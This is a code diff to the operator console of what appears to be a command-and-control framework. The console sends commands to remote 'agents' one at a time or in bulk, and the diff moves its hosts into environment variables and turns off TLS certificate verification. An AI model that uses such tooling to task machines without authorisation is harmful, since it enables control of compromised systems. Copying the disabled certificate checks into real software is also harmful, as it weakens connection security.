@@ -7,6 +7,7 @@ from functions import *
 from sqlalchemy import create_engine, text
 from dotenv import load_dotenv
 import threading
+import urllib3
 
 RED = "\033[1;31m"
 GREEN = "\033[1;92m"
@@ -31,21 +32,24 @@ null_output = [
     "exit",
 ]
 
-# Create the agents.db file and table if it's not already created in the Listeners/http/ directory.
-script_dir = os.path.dirname(os.path.abspath(__file__))
-db_path = os.path.join(script_dir, '..', 'Handlers', 'data', 'agents.db')
-
-# Connect to redis database. Redis stores Agent commands
-r = redis.Redis(host="127.0.0.1", port=6379, db=0, decode_responses=False)
-url = f"http://127.0.0.1:8000/admin" # change later to proper port/ip/domain name
-
-header = {"Content-Type": "application/json"}
-
 load_dotenv("../Handlers/.env")
 db_user = os.getenv('DB_USER')
 db_pass = os.getenv('DB_PASS')
 database = os.getenv('DATABASE')
 db_host = os.getenv('HOST')
+redis_host = os.getenv('REDIS_HOST')
+ygg_core = os.getenv('YGG_CORE')
+
+# Create the agents.db file and table if it's not already created in the Listeners/http/ directory.
+script_dir = os.path.dirname(os.path.abspath(__file__))
+db_path = os.path.join(script_dir, '..', 'Handlers', 'data', 'agents.db')
+
+# Connect to redis database. Redis stores Agent commands
+r = redis.Redis(host=redis_host, port=6379, db=0, decode_responses=False)
+url = f"https://{ygg_core}:8000/admin" # change later to proper port/ip/domain name
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # To hide warnings about self signed ssl
+
+header = {"Content-Type": "application/json"}
 
 try:
     URL = f"mysql+pymysql://{db_user}:{db_pass}@{db_host}:3306/{database}"
@@ -70,7 +74,7 @@ def send_cmd(id, cmd):
 
     try:
         json_payload = {"uuid": id, "command": cmd}
-        response = requests.post(url, json=json_payload, headers=header)
+        response = requests.post(url, verify=False, json=json_payload, headers=header)
         csv_history(os.getenv('PROFILE'), os.getenv('IP'), cmd, os.getenv('HOSTNAME'))
     except:
         print(f"{RED}ERROR: Failed to send. Is HTTP Listener running?{RESET}")
@@ -260,8 +264,8 @@ def mass(bruh):
     for i in range(len(agent_index)):
         try:
             json_payload = {"uuid": result[agent_index[i]][0], "command": command}
-            response = requests.post(url, json=json_payload, headers=header)
-            csv_history(result[agent_index[i]][3], result[agent_index[i]][4], command)
+            response = requests.post(url, verify=False, json=json_payload, headers=header)
+            csv_history(result[agent_index[i]][3], result[agent_index[i]][4], command, result[agent_index[i]][5])
         except:
             print(f"{RED}ERROR: Failed to send. Is HTTP Listener running?{RESET}")
             return
